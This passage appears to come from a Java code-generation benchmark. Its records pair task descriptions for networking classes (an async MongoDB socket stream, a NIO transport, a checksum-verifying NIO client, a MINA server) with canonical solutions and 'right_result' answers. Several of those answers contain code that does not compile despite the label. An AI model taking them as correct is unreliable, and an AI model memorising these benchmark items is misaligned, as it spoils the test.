  this.settings = settings;\n        this.group = group;\n    }\n\n    @Override\n    public void openAsync(final OperationContext operationContext, final AsyncCompletionHandler<Void> handler) {\n        Queue<SocketAddress> socketAddressQueue;\n\n        try {\n            socketAddressQueue = new LinkedList<>(getSocketAddresses(serverAddress, inetAddressResolver));\n        } catch (Throwable t) {\n            handler.failed(t);\n            return;\n        }\n\n        initializeSocketChannel(handler, socketAddressQueue);\n    }\n\n    private void initializeSocketChannel(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue) {\n        if (socketAddressQueue.isEmpty()) {\n            handler.failed(new MongoSocketException(\"Exception opening socket\", serverAddress));\n        } else {\n            SocketAddress socketAddress = socketAddressQueue.poll();\n\n            try {\n                AsynchronousSocketChannel attemptConnectionChannel;\n                attemptConnectionChannel = group == null\n                        ? AsynchronousSocketChannel.open()\n                        : AsynchronousSocketChannel.open(group);\n                attemptConnectionChannel.setOption(StandardSocketOptions.TCP_NODELAY, true);\n                attemptConnectionChannel.setOption(StandardSocketOptions.SO_KEEPALIVE, true);\n                if (settings.getReceiveBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_RCVBUF, settings.getReceiveBufferSize());\n                }\n                if (settings.getSendBufferSize() > 0) {\n                    attemptConnectionChannel.setOption(StandardSocketOptions.SO_SNDBUF, settings.getSendBufferSize());\n                }\n\n                attemptConnectionChannel.connect(socketAddress, null,\n                        new OpenCompletionHandler(handler, socketAddressQueue, attemptConnectionChannel));\n            } catch (IOException e) {\n                handler.failed(new MongoSocketOpenException(\"Exception opening socket\", serverAddress, e));\n            } catch (Throwable t) {\n                handler.failed(t);\n            }\n        }\n    }\n\n    private class OpenCompletionHandler implements CompletionHandler<Void, Object>  {\n        private final AtomicReference<AsyncCompletionHandler<Void>> handlerReference;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n\n        OpenCompletionHandler(final AsyncCompletionHandler<Void> handler, final Queue<SocketAddress> socketAddressQueue,\n                              final AsynchronousSocketChannel attemptConnectionChannel) {\n            this.handlerReference = new AtomicReference<>(handler);\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(final Void result, final Object attachment) {\n            setChannel(new AsynchronousSocketChannelAdapter(attemptConnectionChannel));\n            handlerReference.getAndSet(null).completed(null);\n        }\n\n        @Override\n        public void failed(final Throwable exc, final Object attachment) {\n            AsyncCompletionHandler<Void> localHandler = handlerReference.getAndSet(null);\n\n            if (socketAddressQueue.isEmpty()) {\n                if (exc instanceof IOException) {\n                    localHandler.failed(new MongoSocketOpenException(\"Exception opening socket\", getAddress(), exc));\n                } else {\n                    localHandler.failed(exc);\n                }\n            } else {\n                initializeSocketChannel(localHandler, socketAddressQueue);\n            }\n        }\n    }\n\n    private static final class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        private AsynchronousSocketChannelAdapter(final AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final long timeout, final TimeUnit unit, @Nullable final A attach,\n                             final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer[] dsts, final int offset, final int length, final long timeout, final TimeUnit unit,\n                             @Nullable final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.read(dsts, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final long timeout, final TimeUnit unit, final A attach,\n                              final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer[] srcs, final int offset, final int length, final long timeout, final TimeUnit unit,\n                              final A attach, final CompletionHandler<Long, ? super A> handler) {\n            channel.write(srcs, offset, length, timeout, unit, attach, handler);\n        }\n\n        @Override\n        public <A> void read(final ByteBuffer dst, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.read(dst, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> read(final ByteBuffer dst) {\n            return channel.read(dst);\n        }\n\n        @Override\n        public <A> void write(final ByteBuffer src, final A attachment, final CompletionHandler<Integer, ? super A> handler) {\n            channel.write(src, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> write(final ByteBuffer src) {\n            return channel.write(src);\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.*;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.*;\nimport java.util.Queue;\nimport java.util.concurrent.*;\n\npublic class AsynchronousSocketChannelStream {\n    private final ServerAddress serverAddress;\n    private final InetAddressResolver inetAddressResolver;\n    private final SocketSettings settings;\n    private final AsynchronousChannelGroup group;\n\n    public AsynchronousSocketChannelStream(ServerAddress serverAddress, InetAddressResolver inetAddressResolver, SocketSettings settings, AsynchronousChannelGroup group) {\n        this.serverAddress = serverAddress;\n        this.inetAddressResolver = inetAddressResolver;\n        this.settings = settings;\n        this.group = group;\n    }\n\n    public void openAsync(OperationContext operationContext, AsyncCompletionHandler<Void> handler) throws IOException {\n        Queue<SocketAddress> socketAddressQueue = new ConcurrentLinkedQueue<>();\n        inetAddressResolver.resolve(serverAddress.getHost(), (addresses, resolveException) -> {\n            if (resolveException != null) {\n                handler.failed(resolveException, null);\n                return;\n            }\n            addresses.forEach(ip -> socketAddressQueue.add(new InetSocketAddress(ip, serverAddress.getPort())));\n            initializeSocketChannel(handler, socketAddressQueue);\n        });\n    }\n\n    private void initializeSocketChannel(AsyncCompletionHandler<Void> handler, Queue<SocketAddress> socketAddressQueue) {\n        AsynchronousSocketChannel channel = group == null ? AsynchronousSocketChannel.open() : AsynchronousSocketChannel.open(group);\n        SocketAddress address = socketAddressQueue.poll();\n        if (address == null) {\n            handler.failed(new IOException(\"No addresses to connect to\"), null);\n            return;\n        }\n        channel.connect(address, null, new OpenCompletionHandler(handler, socketAddressQueue, channel));\n    }\n\n    private static class OpenCompletionHandler implements CompletionHandler<Void, Void> {\n        private final AsyncCompletionHandler<Void> userHandler;\n        private final Queue<SocketAddress> socketAddressQueue;\n        private final AsynchronousSocketChannel attemptConnectionChannel;\n        private int retryCount = 0;\n\n        public OpenCompletionHandler(AsyncCompletionHandler<Void> userHandler, Queue<SocketAddress> socketAddressQueue, AsynchronousSocketChannel attemptConnectionChannel) {\n            this.userHandler = userHandler;\n            this.socketAddressQueue = socketAddressQueue;\n            this.attemptConnectionChannel = attemptConnectionChannel;\n        }\n\n        @Override\n        public void completed(Void result, Void attachment) {\n            try {\n                ExtendedAsynchronousByteChannel wrappedChannel = new AsynchronousSocketChannelAdapter(attemptConnectionChannel);\n                userHandler.completed(null, wrappedChannel);\n            } catch (IOException e) {\n                userHandler.failed(e, null);\n            }\n        }\n\n        @Override\n        public void failed(Throwable exc, Void attachment) {\n            if (exc instanceof IOException && retryCount < 3) {\n                retryCount++;\n                SocketAddress nextAddress = socketAddressQueue.poll();\n                if (nextAddress != null) {\n                    attemptConnectionChannel.connect(nextAddress, null, this);\n                    return;\n                }\n            }\n            userHandler.failed(exc, null);\n        }\n    }\n\n    public interface ExtendedAsynchronousByteChannel extends AsynchronousByteChannel {\n        Future<Integer> read(ByteBuffer dst, long timeout, TimeUnit unit, Object attachment, CompletionHandler<Integer, ? super Object> handler);\n        Future<Integer> write(ByteBuffer src, long timeout, TimeUnit unit, Object attachment, CompletionHandler<Integer, ? super Object> handler);\n    }\n\n    public static class AsynchronousSocketChannelAdapter implements ExtendedAsynchronousByteChannel {\n        private final AsynchronousSocketChannel channel;\n\n        public AsynchronousSocketChannelAdapter(AsynchronousSocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public boolean isOpen() {\n            return channel.isOpen();\n        }\n\n        @Override\n        public void close() throws IOException {\n            channel.close();\n        }\n\n        @Override\n        public Future<Integer> read(ByteBuffer dst, Object attachment, CompletionHandler<Integer, ? super Object> handler) {\n            return channel.read(dst, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> write(ByteBuffer src, Object attachment, CompletionHandler<Integer, ? super Object> handler) {\n            return channel.write(src, attachment, handler);\n        }\n\n        @Override\n        public Future<Integer> read(ByteBuffer dst, long timeout, TimeUnit unit, Object attachment, CompletionHandler<Integer, ? super Object> handler) {\n            CompletableFuture<Integer> future = new CompletableFuture<>();\n            ScheduledFuture<?> timer = scheduleTimeout(future, timeout, unit);\n            channel.read(dst, attachment, (result, att) -> {\n                timer.cancel(false);\n                handler.completed(result, att);\n                future.complete(result);\n            }, (exc, att) -> {\n                timer.cancel(false);\n                handler.failed(exc, att);\n                future.completeExceptionally(exc);\n            });\n            return future;\n        }\n\n        @Override\n        public Future<Integer> write(ByteBuffer src, long timeout, TimeUnit unit, Object attachment, CompletionHandler<Integer, ? super Object> handler) {\n            CompletableFuture<Integer> future = new CompletableFuture<>();\n            ScheduledFuture<?> timer = scheduleTimeout(future, timeout, unit);\n            channel.write(src, attachment, (result, att) -> {\n                timer.cancel(false);\n                handler.completed(result, att);\n                future.complete(result);\n            }, (exc, att) -> {\n                timer.cancel(false);\n                handler.failed(exc, att);\n                future.completeExceptionally(exc);\n            });\n            return future;\n        }\n\n        private ScheduledFuture<?> scheduleTimeout(CompletableFuture<Integer> future, long timeout, TimeUnit unit) {\n            return Executors.newScheduledThreadPool(1).schedule(() -> {\n                future.cancel(true);\n            }, timeout, unit);\n        }\n    }\n\n    public interface ServerAddress {\n        String getHost();\n        int getPort();\n    }\n\n    public interface InetAddressResolver {\n        void resolve(String host, CompletionHandler<List<InetAddress>, Void> handler);\n    }\n\n    public interface SocketSettings {\n        int getConnectTimeout();\n        int getReadTimeout();\n        int getWriteTimeout();\n    }\n\n    public interface OperationContext {\n    }\n\n    public interface AsyncCompletionHandler<T> {\n        void completed(T result, Object attachment);\n        void failed(Throwable exc, Object attachment);\n    }\n}\n```"
  },
  {
    "Task_id": 433,
    "Instruction": "Task Description: Implement a Java class that facilitates TCP-based communication using Java NIO (Non-blocking I/O) techniques, supporting both client and server modes with configurable options.\n\nClass Description: NioTransport is a class that provides TCP communication capabilities using Java NIO. It can operate in either server or client mode, supports direct buffers for performance optimization, and includes methods for starting/stopping communication, sending data, and receiving data through a callback mechanism.\n\nAttributes:\n- srv_channel: [ServerSocketChannel] - Server socket channel used in server mode\n- client_channel: [SocketChannel] - Client socket channel for communication\n- receiver_thread: [Receiver] - Thread handling incoming data reception\n- receiver: [RtReceiver] - Callback interface for received data\n- host: [InetAddress] - Host address for connection\n- port: [int] - Port number for communication (default: 7800)\n- server: [boolean] - Flag indicating if operating in server mode\n- direct_buffers: [boolean] - Flag indicating whether to use direct buffers\n- log: [Log] - Logger instance for logging messages\n\nMethods:\n- options(String... options) -> [void] - Configures transport options including server/client mode, host, port, and buffer type\n- receiver(RtReceiver receiver) -> [void] - Sets the receiver callback for incoming data\n- start(String... options) -> [void] - Starts the transport in either server or client mode based on configuration\n- stop() -> [void] - Stops the transport and releases resources\n- send(Object dest, byte[] buf, int offset, int length) -> [void] - Sends data through the established channel\n- Receiver.run() -> [void] - (Inner class method) Continuously receives data and forwards it to the registered receiver",
    "Canonical_solution": "import org.jgroups.logging.Log;\nimport org.jgroups.logging.LogFactory;\nimport org.jgroups.tests.RoundTrip;\nimport org.jgroups.tests.rt.RtReceiver;\nimport org.jgroups.tests.rt.RtTransport;\nimport org.jgroups.util.Util;\n\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\n\npublic class NioTransport implements RtTransport {\n    protected ServerSocketChannel srv_channel;\n    protected SocketChannel       client_channel;\n    protected Receiver            receiver_thread;\n    protected RtReceiver          receiver;\n    protected InetAddress         host;\n    protected int                 port=7800;\n    protected boolean             server, direct_buffers;\n    protected final Log           log=LogFactory.getLog(NioTransport.class);\n\n    public NioTransport() {\n    }\n\n    public void options(String... options) throws Exception {\n        if(options == null)\n            return;\n        for(int i=0; i < options.length; i++) {\n            if(options[i].equals(\"-server\")) {\n                server=true;\n                continue;\n            }\n            if(options[i].equals(\"-host\")) {\n                host=InetAddress.getByName(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-port\")) {\n                port=Integer.parseInt(options[++i]);\n                continue;\n            }\n            if(options[i].equals(\"-direct\")) {\n                direct_buffers=Boolean.parseBoolean(options[++i]);\n            }\n        }\n        if(host == null)\n            host=InetAddress.getLocalHost();\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver=receiver;\n    }\n\n    public void start(String ... options) throws Exception {\n        options(options);\n        if(server) {\n            srv_channel=ServerSocketChannel.open();\n            srv_channel.bind(new InetSocketAddress(host, port), 50);\n            System.out.println(\"server started (ctrl-c to kill)\");\n            for(;;) {\n                client_channel=srv_channel.accept();\n                receiver_thread=new Receiver();\n                receiver_thread.start();\n            }\n        }\n        else {\n            client_channel=SocketChannel.open();\n            client_channel.connect(new InetSocketAddress(host, port));\n            receiver_thread=new Receiver();\n            receiver_thread.start();\n        }\n    }\n\n    public void stop() {\n        Util.close(srv_channel, client_channel);\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) throws Exception {\n        ByteBuffer sbuf=ByteBuffer.wrap(buf, offset, length);\n        client_channel.write(sbuf);\n    }\n\n    protected class Receiver extends Thread {\n        public void run() {\n            ByteBuffer buf=direct_buffers? ByteBuffer.allocateDirect(RoundTrip.PAYLOAD) : ByteBuffer.allocate(RoundTrip.PAYLOAD);\n            for(;;) {\n                try {\n                    buf.position(0);\n                    int num=client_channel.read(buf);\n                    if(num == -1)\n                        break;\n                    if(num != RoundTrip.PAYLOAD)\n                        throw new IllegalStateException(\"expected \" + RoundTrip.PAYLOAD + \" bytes, but got only \" + num);\n                    if(receiver != null) {\n                        buf.flip();\n                        int offset=buf.hasArray()? buf.arrayOffset() + buf.position() : buf.position(), len=buf.remaining();\n                        if(!buf.isDirect())\n                            receiver.receive(null, buf.array(), offset, len);\n                        else {\n                            byte[] tmp=new byte[len];\n                            buf.get(tmp, 0, len);\n                            receiver.receive(null, tmp, 0, len);\n                        }\n                    }\n                }\n                catch(Exception e) {\n                    e.printStackTrace();\n                }\n            }\n            Util.close(client_channel);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.ServerSocketChannel;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class NioTransport {\n    private ServerSocketChannel srv_channel;\n    private SocketChannel client_channel;\n    private Thread receiver_thread;\n    private RtReceiver receiver;\n    private InetAddress host;\n    private int port = 7800;\n    private boolean server = false;\n    private boolean direct_buffers = false;\n    private Log log;\n\n    public interface RtReceiver {\n        void onReceive(SocketChannel channel, byte[] data);\n    }\n\n    public NioTransport(Log log) {\n        this.log = log;\n    }\n\n    public void options(String... options) {\n        for (String opt : options) {\n            String[] parts = opt.split(\"=\");\n            if (parts.length != 2) continue;\n            switch (parts[0]) {\n                case \"server\":\n                    server = Boolean.parseBoolean(parts[1]);\n                    break;\n                case \"host\":\n                    try {\n                        host = InetAddress.getByName(parts[1]);\n                    } catch (Exception e) {\n                        log.error(\"Invalid host: \" + parts[1], e);\n                    }\n                    break;\n                case \"port\":\n                    port = Integer.parseInt(parts[1]);\n                    break;\n                case \"direct_buffers\":\n                    direct_buffers = Boolean.parseBoolean(parts[1]);\n                    break;\n            }\n        }\n    }\n\n    public void receiver(RtReceiver receiver) {\n        this.receiver = receiver;\n    }\n\n    public void start(String... options) {\n        options(options);\n\n        if (server) {\n            startServer();\n        } else {\n            startClient();\n        }\n    }\n\n    private void startServer() {\n        try {\n            srv_channel = ServerSocketChannel.open();\n            srv_channel.configureBlocking(false);\n            srv_channel.bind(new InetSocketAddress(host, port));\n            Selector selector = Selector.open();\n            srv_channel.register(selector, SelectionKey.OP_ACCEPT);\n\n            ExecutorService executor = Executors.newSingleThreadExecutor();\n            executor.execute(() -> {\n                while (!Thread.interrupted()) {\n                    try {\n                        if (selector.selectNow() > 0) {\n                            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n                            while (it.hasNext()) {\n                                SelectionKey key = it.next();\n                                it.remove();\n                                if (key.isAcceptable()) {\n                                    ServerSocketChannel ssc = (ServerSocketChannel) key.channel();\n                                    SocketChannel sc = ssc.accept();\n                                    if (sc != null) {\n                                        sc.configureBlocking(false);\n                                        sc.register(selector, SelectionKey.OP_READ);\n                                        log.info(\"New connection accepted from \" + sc.getRemoteAddress());\n                                    }\n                                }\n                            }\n                        }\n                    } catch (IOException e) {\n                        log.error(\"Selector error in server mode\", e);\n                        break;\n                    }\n                }\n            });\n            log.info(\"Server started on \" + host.getHostAddress() + \":\" + port);\n        } catch (IOException e) {\n            log.error(\"Failed to start server\", e);\n        }\n    }\n\n    private void startClient() {\n        if (host == null) {\n            log.error(\"Host not set for client mode\");\n            return;\n        }\n\n        try {\n            client_channel = SocketChannel.open();\n            client_channel.configureBlocking(false);\n            client_channel.connect(new InetSocketAddress(host, port));\n\n            Selector selector = Selector.open();\n            client_channel.register(selector, SelectionKey.OP_CONNECT);\n\n            new Thread(() -> {\n                try {\n                    while (!Thread.interrupted()) {\n                        if (selector.selectNow() > 0) {\n                            Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n                            while (it.hasNext()) {\n                                SelectionKey key = it.next();\n                                it.remove();\n                                if (key.isConnectable()) {\n                                    SocketChannel sc = (SocketChannel) key.channel();\n                                    if (sc.finishConnect()) {\n                                        log.info(\"Connected to \" + sc.getRemoteAddress());\n                                        sc.register(selector, SelectionKey.OP_READ);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                } catch (IOException e) {\n                    log.error(\"Selector error in client mode\", e);\n                }\n            }).start();\n\n            receiver_thread = new Receiver(client_channel);\n            receiver_thread.start();\n            log.info(\"Client connected to \" + host.getHostAddress() + \":\" + port);\n        } catch (IOException e) {\n            log.error(\"Failed to connect as client\", e);\n        }\n    }\n\n    public void stop() {\n        try {\n            if (srv_channel != null && srv_channel.isOpen()) {\n                srv_channel.close();\n            }\n            if (client_channel != null && client_channel.isOpen()) {\n                client_channel.close();\n            }\n            if (receiver_thread != null) {\n                receiver_thread.interrupt();\n            }\n        } catch (IOException e) {\n            log.error(\"Error stopping transport\", e);\n        }\n    }\n\n    public void send(Object dest, byte[] buf, int offset, int length) {\n        if (!(dest instanceof SocketChannel)) {\n            log.error(\"Destination is not a valid SocketChannel\");\n            return;\n        }\n\n        SocketChannel channel = (SocketChannel) dest;\n        if (!channel.isConnected() || !channel.isOpen()) {\n            log.error(\"Cannot send data; channel is not connected or open\");\n            return;\n        }\n\n        ByteBuffer buffer;\n        if (direct_buffers) {\n            buffer = ByteBuffer.allocateDirect(length);\n        } else {\n            buffer = ByteBuffer.allocate(length);\n        }\n        buffer.put(buf, offset, length);\n        buffer.flip();\n\n        try {\n            channel.write(buffer);\n        } catch (IOException e) {\n            log.error(\"Failed to send data\", e);\n        }\n    }\n\n    private class Receiver extends Thread {\n        private final SocketChannel channel;\n\n        public Receiver(SocketChannel channel) {\n            this.channel = channel;\n        }\n\n        @Override\n        public void run() {\n            try {\n                while (!Thread.interrupted()) {\n                    ByteBuffer buffer;\n                    if (direct_buffers) {\n                        buffer = ByteBuffer.allocateDirect(4096);\n                    } else {\n                        buffer = ByteBuffer.allocate(4096);\n                    }\n\n                    int bytesRead = channel.read(buffer);\n                    if (bytesRead <= 0) {\n                        continue;\n                    }\n\n                    buffer.flip();\n                    byte[] data = new byte[buffer.remaining()];\n                    buffer.get(data);\n                    if (receiver != null) {\n                        receiver.onReceive(channel, data);\n                    }\n                }\n            } catch (IOException e) {\n                log.error(\"Error receiving data\", e);\n            } finally {\n                try {\n                    channel.close();\n                } catch (IOException e) {\n                    log.error(\"Error closing channel\", e);\n                }\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 434,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Java NIO (Non-blocking I/O) for efficient network communication. The client should handle connection establishment, data transmission with checksum verification, and proper resource management.\n\nClass Description: ClientController is a TCP client implementation that manages non-blocking communication with a server. It uses a producer-consumer pattern with an internal queue for packet handling and implements checksum verification for data integrity.\n\nAttributes:\n- inner: BlockingQueue<Packet> - Queue for storing packets to be sent to the server\n- lock: Object - Synchronization lock for thread-safe operations\n- remote: InetSocketAddress - Server address to connect to\n- thread: Thread - Worker thread for handling network operations\n- channel: SocketChannel - NIO channel for communication with the server\n\nMethods:\n- ClientController(String host, int port) -> None - Constructor that initializes the client with server address\n- start() -> void - Starts the client thread if not already running\n- put(Packet packet) -> boolean - Adds a packet to the send queue (non-blocking)\n- clear() -> void - Clears all pending packets from the queue\n- run() -> void - Main thread method that handles connection and I/O operations (internal to ClientThread)\n- write() -> void - Handles packet writing to the channel with checksum calculation (internal to ClientThread)",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.SocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.Iterator;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\nimport java.util.zip.Adler32;\nimport java.util.zip.Checksum;\n\npublic class ClientController {\n\n    private BlockingQueue<Packet> inner = new LinkedBlockingQueue<>(100);\n    private Object lock = new Object();\n    private InetSocketAddress remote;\n    private Thread thread = new ClientThread(remote);\n\n    public ClientController(String host, int port) {\n        remote = new InetSocketAddress(host, port);\n    }\n\n    public void start() {\n        if (thread.isAlive() || remote == null) {\n            return;\n        }\n        synchronized (lock) {\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        return inner.offer(packet);\n    }\n\n    public void clear() {\n        inner.clear();\n    }\n\n    class ClientThread extends Thread {\n        SocketAddress remote;\n        SocketChannel channel;\n\n        ClientThread(SocketAddress remote) {\n            this.remote = remote;\n        }\n\n        @Override\n        public void run() {\n            try {\n                channel = SocketChannel.open();\n                channel.configureBlocking(false);\n                boolean isSuccess = channel.connect(new InetSocketAddress(30008));\n                if (!isSuccess) {\n                    while (!channel.finishConnect()) {\n                        System.out.println(\"Client is connecting...\");\n                    }\n                }\n                System.out.println(\"Client is connected.\");\n\n                Selector selector = Selector.open();\n                channel.register(selector, SelectionKey.OP_WRITE);\n                while (selector.isOpen()) {\n                    selector.select();\n                    Iterator<SelectionKey> it = selector.selectedKeys().iterator();\n                    while (it.hasNext()) {\n                        SelectionKey key = it.next();\n                        it.remove();\n                        if (!key.isValid()) {\n                            continue;\n                        }\n                        if (key.isWritable()) {\n                            write();\n                        }\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            } finally {\n                if (channel != null) {\n                    try {\n                        channel.close();\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n                inner.clear();\n            }\n        }\n\n        private void write() throws Exception {\n            Packet packet = inner.take();\n            synchronized (lock) {\n                ByteBuffer body = packet.getBuffer();\n                ByteBuffer head = ByteBuffer.allocate(4);\n                head.putInt(body.limit());\n                head.flip();\n                while (head.hasRemaining()) {\n                    channel.write(head);\n                }\n\n                Checksum checksum = new Adler32();\n                while (body.hasRemaining()) {\n                    checksum.update(body.get());\n                }\n\n                body.rewind();\n                while (body.hasRemaining()) {\n                    channel.write(body);\n                }\n\n                long cks = checksum.getValue();\n                ByteBuffer tail = ByteBuffer.allocate(8);\n                tail.putLong(cks);\n                tail.flip();\n                while (tail.hasRemaining()) {\n                    channel.write(tail);\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 6,
    "right_result": "```java\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ClosedChannelException;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.Selector;\nimport java.nio.channels.SocketChannel;\nimport java.util.concurrent.BlockingQueue;\nimport java.util.concurrent.LinkedBlockingQueue;\n\npublic class ClientController implements Runnable {\n    private final BlockingQueue<Packet> inner = new LinkedBlockingQueue<>();\n    private final Object lock = new Object();\n    private final InetSocketAddress remote;\n    private Thread thread;\n    private SocketChannel channel;\n    private Selector selector;\n\n    public ClientController(String host, int port) {\n        this.remote = new InetSocketAddress(host, port);\n    }\n\n    public void start() {\n        if (thread == null || !thread.isAlive()) {\n            thread = new Thread(this);\n            thread.start();\n        }\n    }\n\n    public boolean put(Packet packet) {\n        return inner.offer(packet);\n    }\n\n    public void clear() {\n        synchronized (lock) {\n            inner.clear();\n        }\n    }\n\n    @Override\n    public void run() {\n        try {\n            channel = SocketChannel.open();\n            channel.configureBlocking(false);\n            selector = Selector.open();\n            channel.register(selector, SelectionKey.OP_CONNECT);\n            channel.connect(remote);\n\n            while (!Thread.interrupted()) {\n                selector.selectNow();\n                if (channel.finishConnect()) {\n                    channel.register(selector, SelectionKey.OP_WRITE);\n                }\n\n                if (inner.isEmpty()) {\n                    continue;\n                }\n\n                write();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        } finally {\n            closeResources();\n        }\n    }\n\n    private void write() throws IOException {\n        Packet packet = inner.poll();\n        if (packet == null) {\n            return;\n        }\n\n        byte[] data = packet.serialize();\n        int checksum = calculateChecksum(data);\n        ByteBuffer buffer = ByteBuffer.allocate(4 + data.length);\n        buffer.putInt(checksum);\n        buffer.put(data);\n        buffer.flip();\n\n        while (buffer.hasRemaining()) {\n            channel.write(buffer);\n        }\n    }\n\n    private int calculateChecksum(byte[] data) {\n        int sum = 0;\n        for (byte b : data) {\n            sum += b & 0xFF;\n        }\n        return sum;\n    }\n\n    private void closeResources() {\n        try {\n            if (channel != null && channel.isOpen()) {\n                channel.close();\n            }\n        } catch (IOException ignored) {}\n        try {\n            if (selector != null && selector.isOpen()) {\n                selector.close();\n            }\n        } catch (IOException ignored) {}\n    }\n\n    public static class Packet {\n        private final String content;\n\n        public Packet(String content) {\n            this.content = content;\n        }\n\n        public byte[] serialize() {\n            return content.getBytes();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 436,
    "Instruction": "Task Description: Implement a TCP server using Apache MINA framework in Java that handles incoming connections, processes messages, and manages server lifecycle operations.\n\nClass Description: MinaRemotingServer is a concrete implementation of AbstractRemotingServer that uses Apache MINA for TCP communication. It handles server initialization, message processing, and shutdown procedures.\n\nAttributes:\n- acceptor: [IoAcceptor] - The MINA IO acceptor that manages socket connections\n- bindAddress: [InetSocketAddress] - The address and port the server binds to\n\nMethods:\n- serverStart() -> [void] - Initializes and starts the MINA TCP server by:\n  1. Creating a NioSocketAcceptor\n  2. Adding protocol codec and MDC injection filters\n  3. Setting the connection handler\n  4. Configuring session timeouts\n  5. Binding to the specified port\n  Throws RemotingException if startup fails\n\n- serverShutdown() -> [void] - Stops the server by:\n  1. Unbinding from the port\n  2. Disposing of the acceptor resources\n  Throws RemotingException if shutdown fails\n\n- MinaRemotingServer([RemotingServerConfig]) -> [void] - Constructor that initializes with server configuration\n- MinaRemotingServer([RemotingServerConfig], [ChannelEventListener]) -> [void] - Constructor that initializes with both server configuration and channel event listener",
    "Canonical_solution": "import com.github.ltsopensource.remoting.AbstractRemotingServer;\nimport com.github.ltsopensource.remoting.ChannelEventListener;\nimport com.github.ltsopensource.remoting.RemotingServerConfig;\nimport com.github.ltsopensource.remoting.exception.RemotingException;\nimport org.apache.mina.core.service.IoAcceptor;\nimport org.apache.mina.core.session.IoSessionConfig;\nimport org.apache.mina.filter.codec.ProtocolCodecFilter;\nimport org.apache.mina.filter.logging.MdcInjectionFilter;\nimport org.apache.mina.transport.socket.nio.NioSocketAcceptor;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\n\npublic class MinaRemotingServer extends AbstractRemotingServer {\n\n    private IoAcceptor acceptor;\n    private InetSocketAddress bindAddress;\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig) {\n        this(remotingServerConfig, null);\n    }\n\n    public MinaRemotingServer(RemotingServerConfig remotingServerConfig, ChannelEventListener channelEventListener) {\n        super(remotingServerConfig, channelEventListener);\n    }\n\n    @Override\n    protected void serverStart() throws RemotingException {\n        acceptor = new NioSocketAcceptor();\n        acceptor.getFilterChain().addLast(\"codec\", new ProtocolCodecFilter(new MinaCodecFactory(getCodec())));\n        acceptor.getFilterChain().addLast(\"mdc\", new MdcInjectionFilter());\n        acceptor.setHandler(new MinaHandler(this));\n        IoSessionConfig cfg = acceptor.getSessionConfig();\n        cfg.setReaderIdleTime(remotingServerConfig.getReaderIdleTimeSeconds());\n        cfg.setWriterIdleTime(remotingServerConfig.getWriterIdleTimeSeconds());\n        cfg.setBothIdleTime(remotingServerConfig.getServerChannelMaxIdleTimeSeconds());\n\n        bindAddress = new InetSocketAddress(remotingServerConfig.getListenPort());\n        try {\n            acceptor.bind(bindAddress);\n        } catch (IOException e) {\n            throw new RemotingException(\"Start Mina server error\", e);\n        }\n    }\n\n    @Override\n    protected void serverShutdown() throws RemotingException {\n        if (acceptor != null) {\n            